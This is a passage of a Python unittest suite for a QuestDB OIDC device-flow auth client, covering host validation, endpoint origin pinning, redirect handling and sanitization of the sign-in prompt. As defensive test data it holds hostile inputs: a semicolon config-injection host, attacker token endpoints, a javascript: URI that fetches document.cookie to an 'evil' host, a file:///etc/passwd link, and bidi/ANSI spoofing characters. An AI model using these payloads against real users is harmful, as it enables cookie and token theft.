        for bad in ('https://realhost;tls_verify=unsafe_off;x=',
                    'https://a=b'):
            with self.subTest(url=bad):
                with self.assertRaises(OidcConfigError):
                    self._qdb(bad)._require_host()
        # An explicit host= override goes through the same guard (incl.
        # whitespace, which is never valid in a host).
        for bad_host in ('evil;tls_verify=unsafe_off', 'a=b', 'h ost'):
            with self.subTest(host=bad_host):
                with self.assertRaises(OidcConfigError):
                    self._qdb()._require_host(bad_host)
        # A legitimate host (incl. an IPv6 literal, which contains ':') is
        # still accepted — the guard must not over-reject.
        self.assertEqual(self._qdb()._require_host('::1'), '::1')
        self.assertEqual(
            self._qdb()._require_host('questdb.example.com'),
            'questdb.example.com')
        # The guard fires through the adapter (sender), before the conf string
        # is built and handed to Sender.from_conf.
        qdb = self._qdb('https://realhost;tls_verify=unsafe_off:9000')
        fake = types.ModuleType('questdb.ingress')
        fake.Sender = object()  # import must succeed so we reach the guard
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            with self.assertRaises(OidcConfigError):
                qdb.sender()

    def test_sender_hostless_url_raises(self):
        # The guard propagates through an adapter (not just the helper):
        # sender() on a host-less URL raises OidcConfigError. See M5.
        qdb = self._qdb('questdb:9000')
        fake = types.ModuleType('questdb.ingress')
        fake.Sender = object()  # import must succeed so we reach the guard
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            with self.assertRaises(OidcConfigError):
                qdb.sender()

    def test_sql_missing_pandas_raises(self):
        qdb = self._qdb()
        with mock.patch.dict(sys.modules, {'pandas': None}):
            with self.assertRaises(ImportError):
                qdb.sql('SELECT 1')

    @unittest.skipIf(importlib.util.find_spec('sqlalchemy') is not None,
                     'sqlalchemy installed')
    def test_sqlalchemy_engine_missing_dep_raises(self):
        with self.assertRaises(ImportError):
            self._qdb().sqlalchemy_engine()

    @unittest.skipIf(_HAS_PG_DRIVER, 'a PostgreSQL driver is installed')
    def test_psycopg_missing_dep_raises(self):
        with self.assertRaises(ImportError):
            self._qdb().psycopg()

    @unittest.skipIf(_HAS_PG_DRIVER, 'a PostgreSQL driver is installed')
    def test_pg_module_missing_chains_cause(self):
        # The "no PG driver" ImportError chains the underlying import failure
        # (raise ... from e) so the traceback preserves the real cause.
        from questdb.auth._questdb import _pg_module
        with self.assertRaises(ImportError) as cm:
            _pg_module()
        self.assertIsInstance(cm.exception.__cause__, ImportError)

    @unittest.skipIf(importlib.util.find_spec('questdb.ingress') is not None,
                     'questdb.ingress extension is built')
    def test_sender_missing_extension_raises(self):
        with self.assertRaises(ImportError):
            self._qdb().sender()


class TestConfigHelpers(unittest.TestCase):
    def test_as_bool_variants(self):
        from questdb.auth._discovery import _as_bool
        for v in ('true', 'True', '1', 'yes', 'on', True, 1):
            self.assertIs(_as_bool(v), True)
        for v in ('false', '0', 'no', 'off', '', False, 0):
            self.assertIs(_as_bool(v), False)
        self.assertIsNone(_as_bool(None))
        self.assertIs(_as_bool(None, default=True), True)

    def test_resolve_endpoint_relative_path(self):
        from questdb.auth._discovery import _resolve_endpoint
        cfg = {'acl.oidc.host': 'idp.example.com',
               'acl.oidc.tls.enabled': True, 'acl.oidc.port': 443}
        self.assertEqual(_resolve_endpoint('/as/token.oauth2', cfg),
                         'https://idp.example.com:443/as/token.oauth2')
        self.assertEqual(_resolve_endpoint('https://idp/x', cfg),
                         'https://idp/x')  # absolute is kept verbatim

    def test_resolve_endpoint_ignores_non_string(self):
        # A non-string endpoint from /settings (e.g. a JSON number) must be
        # treated as absent, not raise AttributeError from .startswith(). M3.
        from questdb.auth._discovery import _resolve_endpoint
        self.assertIsNone(_resolve_endpoint(8080, {}))
        self.assertIsNone(_resolve_endpoint(True, {}))

    def test_str_setting_ignores_non_string(self):
        # A non-empty string passes through; anything else (a JSON list /
        # number / dict, None, empty string) reads as absent so it can't reach
        # scope.split() / the cache-key join as a raw object.
        from questdb.auth._discovery import _str_setting
        self.assertEqual(_str_setting('openid email'), 'openid email')
        for bad in (['openid'], 12345, {'x': 1}, True, '', None):
            self.assertIsNone(_str_setting(bad))

    def test_non_string_settings_do_not_crash_resolution(self):
        # A buggy/tampered /settings advertising non-string acl.oidc.* values
        # must stay within the typed-error contract instead of crashing later
        # with a bare AttributeError / TypeError (scope.split() / the cache-key
        # join). scope falls back to 'openid', audience drops to None, and a
        # non-string client.id reads as absent -> clear OidcConfigError.
        from questdb.auth import _discovery
        base = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://idp.example.com/token',
            'acl.oidc.device.authorization.endpoint':
                'https://idp.example.com/device'}

        def from_settings(settings):
            with mock.patch.object(_discovery, 'fetch_settings',
                                   return_value=settings):
                return OidcDeviceAuth.from_questdb(
                    'https://qdb.example.com:9000', renderer=Renderer())

        auth = from_settings({**base, 'acl.oidc.scope': ['openid', 'groups'],
                              'acl.oidc.audience': {'x': 1}})
        self.assertEqual(auth.config.scope, 'openid')   # non-string -> default
        self.assertIsNone(auth.config.audience)         # non-string -> dropped
        self.assertTrue(auth.cache_key)                 # crash site now safe
        # A non-string client.id reads as absent -> clear typed error.
        with self.assertRaises(OidcConfigError):
            from_settings({**base, 'acl.oidc.client.id': 12345})

    def test_non_string_idp_discovery_values_do_not_crash(self):
        # The IdP .well-known discovery document is untrusted too: a non-string
        # endpoint / issuer (a JSON number/list from a buggy or hostile IdP)
        # must read as absent -> a clear OidcConfigError, not a bare
        # AttributeError from safe_urlparse later. See resolve_config discovery.
        from questdb.auth import _discovery
        settings = {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'}

        def from_discovery(well_known, **kw):
            with mock.patch.object(_discovery, 'fetch_settings',
                                   return_value=settings), \
                 mock.patch.object(
                     _discovery, 'discover_device_endpoint_from_idp',
                     return_value=well_known):
                return OidcDeviceAuth.from_questdb(
                    'https://qdb.example.com:9000', renderer=Renderer(), **kw)

        # Non-string token / device endpoint -> absent -> clear typed error.
        with self.assertRaises(OidcConfigError):
            from_discovery(
                {'device_authorization_endpoint': 'https://idp.example.com/device',
                 'token_endpoint': 12345},
                issuer='https://idp.example.com')
        with self.assertRaises(OidcConfigError):
            from_discovery(
                {'device_authorization_endpoint': ['nope'],
                 'token_endpoint': 'https://idp.example.com/token'},
                issuer='https://idp.example.com')
        # A non-string discovered issuer is dropped (no pin); valid endpoints
        # still resolve and the cache key builds (the former crash site).
        auth = from_discovery(
            {'device_authorization_endpoint': 'https://idp.example.com/device',
             'token_endpoint': 'https://idp.example.com/token',
             'issuer': ['not', 'a', 'string']},
            discovery_url='https://idp.example.com/.well-known/openid-configuration')
        self.assertIsNone(auth.config.issuer)
        self.assertTrue(auth.cache_key)

    def test_resolve_endpoint_relative_path_without_host_is_none(self):
        # A path-only endpoint with no acl.oidc.host can't be resolved; it must
        # be treated as absent (None) so resolution fails with a clear "could
        # not resolve the ... endpoint" error rather than a scheme-less "/path"
        # that later surfaces as a confusing "insecure/malformed URL".
        from questdb.auth._discovery import _resolve_endpoint
        self.assertIsNone(_resolve_endpoint('/as/token.oauth2', {}))
        self.assertIsNone(  # port present but host missing -> still unresolved
            _resolve_endpoint('/as/token.oauth2', {'acl.oidc.port': 443}))

    def test_settings_config_nesting(self):
        from questdb.auth._discovery import settings_config
        self.assertEqual(settings_config({'config': {'a': 1}}), {'a': 1})
        self.assertEqual(settings_config({'a': 1}), {'a': 1})  # flat fallback

    def test_settings_config_ignores_user_writable_preferences(self):
        # QuestDB /settings nests server-authoritative values under "config"
        # alongside a user-writable "preferences" sibling (the web console
        # persists UI prefs there). Discovery must read only "config", so a user
        # who can write a preference cannot smuggle an acl.oidc.* key in to
        # redirect the device code / refresh token. Ported from the Java client.
        from questdb.auth._discovery import settings_config
        resp = {
            'config': {
                'acl.oidc.client.id': 'questdb',
                'acl.oidc.token.endpoint': 'https://idp.example.com/token'},
            'preferences.version': 0,
            'preferences': {
                'acl.oidc.token.endpoint': 'https://evil.example.com/token'},
        }
        cfg = settings_config(resp)
        self.assertEqual(cfg['acl.oidc.token.endpoint'],
                         'https://idp.example.com/token')
        self.assertNotIn('evil', str(cfg))
        # A structured response (one carrying the user-writable "preferences"
        # sibling) must NOT fall back to trusting the top level when "config" is
        # absent or malformed: read nothing rather than the top level.
        self.assertEqual(
            settings_config({'preferences': {'acl.oidc.token.endpoint': 'x'}}),
            {})
        self.assertEqual(
            settings_config({'config': None,
                             'preferences': {'acl.oidc.client.id': 'x'}}),
            {})
        # A genuinely flat / legacy response (no config/preferences split) is
        # still tolerated at the top level.
        self.assertEqual(settings_config({'acl.oidc.client.id': 'q'}),
                         {'acl.oidc.client.id': 'q'})

    def test_make_cache_variants(self):
        # The cache factory resolves the documented specs and rejects an
        # unknown one with a typed error. See M4.
        from questdb.auth._cache import make_cache, MemoryCache, NullCache
        self.assertIsInstance(make_cache('memory'), MemoryCache)
        self.assertIsInstance(make_cache(None), NullCache)
        self.assertIsInstance(make_cache('none'), NullCache)
        custom = MemoryCache()
        self.assertIs(make_cache(custom), custom)  # a TokenCache passes through
        with self.assertRaises(OidcConfigError):
            make_cache('disk')


class TestEndpointValidation(unittest.TestCase):
    def setUp(self):
        from questdb.auth._discovery import validate_endpoint_origins
        self._validate = validate_endpoint_origins

    def test_default_port_equivalence_accepted(self):
        # https default (443) vs explicit :443 normalize to the same origin.
        self._validate('https://idp/token', 'https://idp:443/device')

    def test_ipv6_same_origin_accepted(self):
        self._validate('https://[::1]/token', 'https://[::1]/device')

    def test_off_origin_device_rejected(self):
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp/token', 'https://evil.example/device')

    def test_both_endpoints_off_issuer_rejected(self):
        # Endpoints agree with each other but not with the pinned issuer:
        # the issuer-pin loop must check both, not just their consistency.
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp/token', 'https://idp/device',
                           issuer='https://other-issuer.example')

    def test_malformed_port_raises_config_error(self):
        # A non-integer port must surface as OidcConfigError, not urllib's bare
        # ValueError (which callers catching OidcError would miss). See M6.
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp:notaport/token',
                           'https://idp:notaport/device')

    def test_malformed_ipv6_endpoint_raises_config_error(self):
        # A malformed IPv6 literal makes urllib.parse.urlparse() itself raise
        # ValueError (before .port is read); it must surface as OidcConfigError,
        # not a bare ValueError escaping the typed-error contract. See M1.
        with self.assertRaises(OidcConfigError):
            self._validate('https://[::1', 'https://[::1')
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth(
                client_id='questdb',
                device_authorization_endpoint='https://[::1',
                token_endpoint='https://[::1',
                renderer=Renderer())

    def test_explicit_constructor_enforces_co_location(self):
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth(
                client_id='questdb',
                device_authorization_endpoint='https://idp.example.com/device',
                token_endpoint='https://attacker.example/token',
                renderer=Renderer())

    def test_endpoint_path_under_issuer(self):
        # M1: segment-aware path containment used to isolate path-based realms.
        from questdb.auth._discovery import _endpoint_path_under_issuer as under
        iss = 'https://idp.example.com/realms/prod'
        self.assertTrue(under(iss + '/protocol/openid-connect/token', iss))
        self.assertTrue(under(iss, iss))                       # exact path
        self.assertTrue(under(iss + '/', iss))                 # trailing slash
        self.assertFalse(under('https://idp.example.com/realms/EVIL/token', iss))
        self.assertFalse(  # not a *segment* prefix: prod != production
            under('https://idp.example.com/realms/production/token', iss))
        # A root issuer (no path) constrains the origin only -> any path is in.
        self.assertTrue(
            under('https://idp.example.com/anything', 'https://idp.example.com'))
        self.assertTrue(
            under('https://idp.example.com/x', 'https://idp.example.com/'))
        # A '.' / '..' segment (even percent-encoded) is rejected: urllib sends
        # the dotted path verbatim and the IdP / proxy normalizes it to a
        # DIFFERENT realm, which an origin check can't catch.
        self.assertFalse(under(iss + '/../EVIL/protocol/token', iss))
        self.assertFalse(under(iss + '/%2e%2e/EVIL/token', iss))
        self.assertFalse(under(iss + '/./token', iss))


class TestCacheKey(unittest.TestCase):
    def _auth(self, **kw):
        opts = dict(
            client_id='questdb',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            scope='openid groups', groups_in_token=True, cache='memory',
            renderer=Renderer())
        opts.update(kw)
        return OidcDeviceAuth(**opts)

    def test_normalize_url_malformed_port_raises_config_error(self):
        # cache_key normalization shares the same typed-port guard: a malformed
        # port raises OidcConfigError, not a bare ValueError. See M6.
        from questdb.auth._device import _normalize_url
        with self.assertRaises(OidcConfigError):
            _normalize_url('https://idp:notaport/token')

    def test_normalize_url_malformed_ipv6_raises_config_error(self):
        # cache_key normalization must also map a malformed IPv6 literal (which
        # makes urlparse itself raise) to OidcConfigError, not a bare
        # ValueError. See M1.
        from questdb.auth._device import _normalize_url
        with self.assertRaises(OidcConfigError):
            _normalize_url('https://[::1')

    def test_realm_path_distinguishes_key(self):
        # Multi-tenant IdP: same host, different realm path -> distinct keys
        # (the old origin-only key collided, leaking one realm's token).
        a = self._auth(
            token_endpoint='https://idp.example.com/realmA/token',
            device_authorization_endpoint='https://idp.example.com/realmA/dev')
        b = self._auth(
            token_endpoint='https://idp.example.com/realmB/token',
            device_authorization_endpoint='https://idp.example.com/realmB/dev')
        self.assertNotEqual(a.cache_key, b.cache_key)

    def test_scope_order_does_not_change_key(self):
        self.assertEqual(
            self._auth(scope='openid groups').cache_key,
            self._auth(scope='groups openid').cache_key)

    def test_audience_distinguishes_key(self):
        self.assertNotEqual(
            self._auth(audience='aud-1').cache_key,
            self._auth(audience='aud-2').cache_key)

    def test_default_port_normalized(self):
        self.assertEqual(
            self._auth(token_endpoint='https://idp.example.com/token').cache_key,
            self._auth(
                token_endpoint='https://idp.example.com:443/token').cache_key)

    def test_groups_in_token_distinguishes_key(self):
        # groups_in_token selects which token kind _select returns, so two
        # sessions differing ONLY in that mode must not collide on one cache
        # entry (and evict each other). scope already has 'openid' here, so the
        # keys can differ only by the mode.
        self.assertNotEqual(
            self._auth(groups_in_token=True).cache_key,
            self._auth(groups_in_token=False).cache_key)


class TestTransportSecurity(unittest.TestCase):
    def test_require_secure_policy(self):
        from questdb.auth._http import _require_secure
        # https is always fine.
        _require_secure('https://idp.example.com/x', insecure=False)
        # loopback http never leaves the host -> always allowed.
        _require_secure('http://127.0.0.1:9000/x', insecure=False)
        _require_secure('http://localhost/x', insecure=False)
        _require_secure('http://[::1]:8080/x', insecure=False)
        # non-loopback http is refused unless insecure is explicitly set.
        with self.assertRaises(OidcConfigError):
            _require_secure('http://idp.example.com/x', insecure=False)
        _require_secure('http://idp.example.com/x', insecure=True)

    def test_post_form_attaches_status_to_non_json_error(self):
        # The device-flow poll loop and the silent refresh classify a non-JSON
        # token-endpoint failure (4xx terminal vs 5xx/429 transient) by the HTTP
        # status, so post_form must attach it to the raised OidcError. M1/M2.
        from questdb.auth._http import post_form
        with _raw_response_server(403, 'text/plain', b'forbidden') as raw:
            with self.assertRaises(OidcError) as cm:
                post_form(raw + '/token', {'grant_type': 'x'})
        self.assertEqual(cm.exception.status, 403)
        # A non-JSON 5xx likewise carries its status (classified as transient).
        with _raw_response_server(503, 'text/html', b'<h1>bad gw</h1>') as raw:
            with self.assertRaises(OidcError) as cm:
                post_form(raw + '/token', {'grant_type': 'x'})
        self.assertEqual(cm.exception.status, 503)

    def test_insecure_does_not_downgrade_idp(self):
        # insecure=True must NOT permit plaintext to a non-loopback IdP: the
        # device code / refresh token must never traverse the network in clear.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint='http://idp.example.com/device',
            token_endpoint='http://idp.example.com/token',
            scope='openid', groups_in_token=False, cache='memory',
            insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        with self.assertRaises(OidcConfigError):
            auth.token()

    def test_redirects_are_not_followed(self):
        # A 30x must NOT be followed: urllib would otherwise re-send the
        # Authorization: Bearer header (and downgrade to plaintext http) to the
        # redirect target, leaking the QuestDB token off-origin (only the
        # original URL is vetted, never the redirect target). The redirect must
        # surface as a non-2xx response, and the off-origin host must never be
        # contacted. See C1.
        from questdb.auth import _http

        seen = []

        class _Redir(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                seen.append((self.path, self.headers.get('Authorization')))
                if self.path == '/exec':
                    self.send_response(302)
                    self.send_header('Location', attacker + '/stolen')
                    self.end_headers()
                else:
                    self.send_response(200)
                    self.send_header('Content-Length', '2')
                    self.end_headers()
                    self.wfile.write(b'{}')

        victim = http.server.HTTPServer(('127.0.0.1', 0), _Redir)
        thief = http.server.HTTPServer(('127.0.0.1', 0), _Redir)
        attacker = f'http://127.0.0.1:{thief.server_port}'
        for srv in (victim, thief):
            threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            resp = _http.request(
                'GET', f'http://127.0.0.1:{victim.server_port}/exec',
                headers={'Authorization': 'Bearer SECRET'}, timeout=5)
        finally:
            for srv in (victim, thief):
                srv.shutdown()
                srv.server_close()

        # The redirect surfaced as a non-2xx response, was not followed, and the
        # off-origin target never saw the request (or the bearer token).
        self.assertEqual(resp.status, 302)
        self.assertEqual(seen, [('/exec', 'Bearer SECRET')])

    def test_malformed_url_raises_config_error(self):
        # A non-integer port must surface as OidcConfigError, not a raw
        # http.client.InvalidURL escaping the typed-error contract — this is the
        # path the QuestDB /settings / discovery fetches go through. See M3.
        from questdb.auth._http import request
        with self.assertRaises(OidcConfigError):
            request('GET', 'https://questdb.example.com:notaport/settings',
                    timeout=5)

    def test_require_secure_rejects_malformed_ipv6(self):
        # _require_secure routes through safe_urlparse, so a malformed IPv6
        # endpoint raises OidcConfigError instead of a bare ValueError (urlparse
        # raises before the scheme is even inspected). See M1.
        from questdb.auth._http import _require_secure
        with self.assertRaises(OidcConfigError):
            _require_secure('https://[::1', insecure=False)
        # A well-formed IPv6 URL is still accepted (loopback http is allowed).
        _require_secure('http://[::1]:8080/x', insecure=False)

    def test_bad_ca_bundle_raises_config_error(self):
        # A missing or invalid CA bundle path (explicit or via env) must surface
        # as OidcConfigError, not a raw FileNotFoundError / ssl.SSLError. See M1.
        import tempfile
        from questdb.auth._http import build_ssl_context
        with self.assertRaises(OidcConfigError):
            build_ssl_context('/no/such/path/ca.pem')
        with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False) as f:
            f.write('not a certificate')
            bad = f.name
        try:
            with self.assertRaises(OidcConfigError):
                build_ssl_context(bad)
        finally:
            os.unlink(bad)

    def test_deeply_nested_json_raises_oidc_error(self):
        # A RecursionError from json.loads (a deeply-nested JSON body exhausts
        # the decoder's stack) must be mapped to OidcError, not escape the
        # typed-error contract. The depth at which json actually raises is a
        # Python-version detail — the C scanner ignores sys.setrecursionlimit,
        # and 3.14 parses far deeper than 3.13, so a fixed-depth body no longer
        # raises there — so inject the RecursionError directly to test the
        # mapping deterministically across versions. See M1.
        from questdb.auth import _http
        with _raw_response_server(
                    200, 'application/json', b'{"ok": true}') as base, \
                mock.patch.object(
                    _http.json, 'loads',
                    side_effect=RecursionError('nesting too deep')):
            with self.assertRaises(OidcError):
                _http.get_json(base + '/x', timeout=5)
            with self.assertRaises(OidcError):
                _http.post_form(base + '/x', {'a': 'b'}, timeout=5)

    def test_post_form_non_json_2xx_raises_oidc_error(self):
        # A 2xx body from the token/device endpoint that isn't JSON (e.g. an
        # HTML login page from a proxy in front of the IdP) must surface as
        # OidcError, not a raw decoder error. Only /exec had this before. M4.
        from questdb.auth import _http
        with _raw_response_server(200, 'text/html', b'<html>login</html>') as b:
            with self.assertRaises(OidcError):
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)

    def test_post_form_non_dict_json_raises_oidc_error(self):
        # A 2xx JSON array (valid JSON but not an object) from the token
        # endpoint must surface as OidcError. See M4.
        from questdb.auth import _http
        with _raw_response_server(200, 'application/json', b'[1, 2, 3]') as b:
            with self.assertRaises(OidcError):
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)

    def test_get_json_non_2xx_raises_oidc_error(self):
        # A non-2xx /settings or discovery response must surface as OidcError.
        # See M4.
        from questdb.auth import _http
        with _raw_response_server(500, 'text/plain', b'boom') as b:
            with self.assertRaises(OidcError):
                _http.get_json(b + '/settings', timeout=5)

    def test_get_json_non_json_2xx_raises_oidc_error(self):
        # A 2xx /settings or discovery body that isn't JSON must surface as
        # OidcError, not a raw JSONDecodeError. See M4.
        from questdb.auth import _http
        with _raw_response_server(200, 'text/html', b'<html>x</html>') as b:
            with self.assertRaises(OidcError):
                _http.get_json(
                    b + '/.well-known/openid-configuration', timeout=5)


class TestRendererSecurity(unittest.TestCase):
    """The Jupyter prompt must never turn an IdP-supplied URL into a
    clickable/executable link unless it uses an http(s) scheme."""

    def test_safe_link_url_allowlist(self):
        from questdb.auth._render import _safe_link_url
        self.assertEqual(_safe_link_url('https://idp/x'), 'https://idp/x')
        self.assertEqual(_safe_link_url('http://idp/x'), 'http://idp/x')
        self.assertEqual(_safe_link_url('HTTPS://idp/x'), 'HTTPS://idp/x')
        for bad in ('javascript:alert(1)', 'data:text/html,x',
                    'vbscript:x', 'file:///etc/passwd', '', None):
            self.assertIsNone(_safe_link_url(bad))

    def test_render_link_inert_for_dangerous_scheme(self):
        from questdb.auth._render import _render_link
        safe = _render_link('https://idp/x')
        self.assertIn('<a href="https://idp/x"', safe)
        evil = _render_link('javascript:alert(document.cookie)')
        self.assertNotIn('<a ', evil)
        self.assertNotIn('href', evil)

    def test_jupyter_prompt_never_emits_dangerous_href(self):
        from questdb.auth._render import JupyterRenderer

        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):  # avoid importing IPython
                captured['html'] = html_str

        # A hostile/MITM'd device response.
        _Capturing().on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'javascript:fetch("//evil/?c="+document.cookie)',
            'verification_uri_complete': 'data:text/html,<script>x</script>',
            'expires_in': 600, 'interval': 5,
        })
        html_out = captured['html'].lower()
        self.assertNotIn('<a ', html_out)            # no clickable link at all
        self.assertNotIn('href="javascript', html_out)
        self.assertNotIn('href="data:', html_out)

        # A legitimate https URL still renders as a clickable link.
        captured.clear()
        _Capturing().on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'https://idp.example.com/device',
            'expires_in': 600, 'interval': 5,
        })
        self.assertIn('<a href="https://idp.example.com/device"',
                      captured['html'])

    def test_jupyter_prompt_strips_control_and_bidi_chars(self):
        # M3: the Jupyter path must ALSO strip control / bidi / zero-width chars
        # from untrusted device-response fields — html.escape neutralizes markup
        # but NOT a U+202E bidi override or zero-width chars, which can visually
        # spoof the sign-in prompt in the notebook DOM. chr(cp) keeps the
        # invisible characters out of the test source.
        from questdb.auth._render import JupyterRenderer

        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):  # avoid importing IPython
                captured['html'] = html_str

        r = _Capturing()
        r.on_prompt({
            'user_code': 'WD' + chr(0x202e) + 'JB' + chr(0x200b),
            'verification_uri': 'https://idp.example.com/' + chr(0x202e),
            'verification_uri_complete':
                'https://idp.example.com/c' + chr(0x200b) + 'omplete',
            'expires_in': 600, 'interval': 5,
        })
        for cp in (0x202e, 0x200b):
            self.assertNotIn(chr(cp), captured['html'],
                             f'U+{cp:04X} reached the notebook DOM')
        self.assertIn('idp.example.com', captured['html'])

        # identity (untrusted JWT claim) on success and error_description on
        # failure are sanitized too — both re-render the prompt head.
        r.on_success('alice' + chr(0x202e) + '@evil', 3600)
        self.assertNotIn(chr(0x202e), captured['html'])
        r.on_failure('access denied ' + chr(0x202e) + 'spoof')
        self.assertNotIn(chr(0x202e), captured['html'])

    def test_terminal_prompt_strips_control_chars(self):
        # A hostile/MITM'd device response must not inject ANSI escape sequences
        # into the plain-text terminal prompt (cursor moves / screen clears that
        # could spoof the sign-in URL). The Jupyter path html-escapes; the
        # terminal path strips control characters. See M5.
        import io
        from questdb.auth._render import format_prompt, TerminalRenderer
        resp = {
            'user_code': 'WDJB\x1bMJHT',
            'verification_uri': 'https://idp.example.com/\x1b[31mdevice',
            'verification_uri_complete': 'https://idp.example.com/d\x07ev',
        }
        text = format_prompt(resp)
        self.assertNotIn('\x1b', text)            # ESC stripped
        self.assertNotIn('\x07', text)            # BEL stripped
        self.assertIn('WDJBMJHT', text)           # printable user_code survives
        self.assertIn('idp.example.com', text)

        # The full terminal path (on_prompt + on_failure) is clean too.
        buf = io.StringIO()
        r = TerminalRenderer(stream=buf)
        r.on_prompt(resp)
        r.on_failure('denied \x1b[2K by idp')     # IdP error_description path
        out = buf.getvalue()
        self.assertNotIn('\x1b', out)
        self.assertNotIn('\x07', out)

    def test_terminal_prompt_survives_unencodable_stream(self):
        # On a stream whose encoding can't represent the prompt's emoji (a
        # legacy code-page Windows console, an `ascii` PYTHONIOENCODING, or a
        # redirected stderr), the decorative glyphs must degrade but the
        # verification URL and user code must STILL reach the user — not vanish
        # into a silent hang. M3.
        from questdb.auth._render import TerminalRenderer

        class _AsciiStream:
            encoding = 'ascii'

            def __init__(self):
                self.parts = []

            def write(self, s):
                s.encode(self.encoding)  # raises UnicodeEncodeError, like a TTY
                self.parts.append(s)

            def flush(self):
                pass

        stream = _AsciiStream()
        r = TerminalRenderer(stream=stream)
        r.on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'https://idp.example.com/device',
        })
        r.on_success('alice@example.com', 3600)
        r.on_failure('access denied')
        out = ''.join(stream.parts)
        # The essential content survived (only the un-encodable glyphs were
        # replaced); nothing was blackholed and no exception escaped.
        self.assertIn('https://idp.example.com/device', out)
        self.assertIn('WDJB-MJHT', out)
        self.assertIn('alice@example.com', out)
        self.assertIn('access denied', out)
        out.encode('ascii')  # the whole transcript is ascii-encodable

    def test_strip_control_removes_bidi_and_zero_width(self):
        # Beyond C0/C1, untrusted device-response fields must have Unicode
        # bidi-override / zero-width / line-separator characters stripped before
        # they reach a TTY: U+202E (RIGHT-TO-LEFT OVERRIDE) can visually reverse
        # a URL to spoof the sign-in host. chr(cp) avoids embedding the
        # (invisible) characters in the test source. See M2.
        from questdb.auth._render import _strip_control, format_prompt
        for cp in (0x202e, 0x202d, 0x2066, 0x2069, 0x200b, 0x200f,
                   0x2028, 0x2029, 0xfeff,
                   # also the format/bidi code points added for M3:
                   0x00ad, 0x061c, 0x115f, 0x180e, 0x2060, 0x2064, 0xfff9):
            self.assertEqual(_strip_control('a' + chr(cp) + 'b'), 'ab',
                             f'U+{cp:04X} not stripped')
        # Legitimate text (incl. accents / CJK / printable ASCII) is preserved.
        self.assertEqual(_strip_control('café 北京 user-1'), 'café 北京 user-1')
        text = format_prompt({
            'user_code': 'WD' + chr(0x202e) + 'JB',
            'verification_uri': 'https://idp.example.com/' + chr(0x202e)})
        self.assertNotIn(chr(0x202e), text)
        self.assertIn('idp.example.com', text)

    def test_qr_helpers_degrade_without_qrcode(self):
        # The QR helpers must degrade gracefully (return None), never raise,
        # when `qrcode` is absent or the data is empty. See M4.
        from questdb.auth import _render
        with mock.patch.dict(sys.modules, {'qrcode': None}):
            self.assertIsNone(_render._qr_ascii('https://idp/x'))
            self.assertIsNone(_render._qr_data_uri('https://idp/x'))
        self.assertIsNone(_render._qr_ascii(''))
        self.assertIsNone(_render._qr_data_uri(''))

    def test_non_string_verification_uri_does_not_crash(self):
        # A hostile/buggy device response with a non-string verification_uri /
        # _complete (e.g. a JSON number or list) must not crash the renderer
        # with a raw TypeError/AttributeError before the prompt is shown; the
        # field is coerced away. See _verification_uri / _safe_link_url.
        import io
        from questdb.auth._render import (
            format_prompt, TerminalRenderer, JupyterRenderer)
        resp = {'user_code': 'WDJB-MJHT', 'verification_uri': 12345,
                'verification_uri_complete': ['not', 'a', 'str'],
                'expires_in': 600, 'interval': 5}
        self.assertIn('WDJB-MJHT', format_prompt(resp))         # plain-text path
        TerminalRenderer(stream=io.StringIO()).on_prompt(resp)  # must not raise
        captured = {}

        class _Cap(JupyterRenderer):
            def _display(self, html_str):
                captured['html'] = html_str

        _Cap().on_prompt(resp)                                  # must not raise
        self.assertNotIn('<a ', captured['html'])               # no link, non-str


if __name__ == '__main__':
    unittest.main()
